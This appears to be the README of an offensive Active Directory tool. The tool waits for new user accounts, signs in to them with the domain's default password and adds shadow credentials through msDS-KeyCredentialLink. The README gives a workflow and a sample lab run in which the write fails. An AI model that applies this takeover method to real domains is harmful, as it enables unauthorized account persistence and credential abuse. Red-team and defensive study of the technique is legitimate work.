# AccountShadowTakeover

A python script to automatically add a KeyCredentialLink to newly created users, by quickly connecting to them with default credentials.



## Features 

 - [x] Automatically add a `msDS-KeyCredentialLink` to newly created users using default password.

## Workflow

Requirements :
 - Knowledge of the default password attrributed to new users in the domain.
 - PKINIT ?

 1. Wait for a new User account to be created
 2. Connect with the default password
 3. Add `msDS-KeyCredentialLink` field to the account
 4. Goto 1

```
[+]======================================================
[+]    AccountShadowTakeover v1.0        @podalirius_    
[+]======================================================

[>] Waiting for new user creations ...
[+] User 'CN=takeuser20,CN=Users,DC=LAB,DC=local' was added.
   [>] Trying to add shadow credentials to 'takeuser20'
     | Trying to authenticate with user 'LAB.local\takeuser20' and password 'Corp2021!'
     | Authentication successful!
     | Generating certificate
     | Certificate generated
     | Generating KeyCredential
     | KeyCredential generated with DeviceID: cdb617df-94cc-2319-cc4e-999001fbd978
     | Updating the msDS-KeyCredentialLink attribute of takeuser20
{'result': 50, 'description': 'insufficientAccessRights', 'dn': '', 'message': '00002098: SecErr: DSID-03150F94, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00', 'referrals': None, 'type': 'modifyResponse'}
```
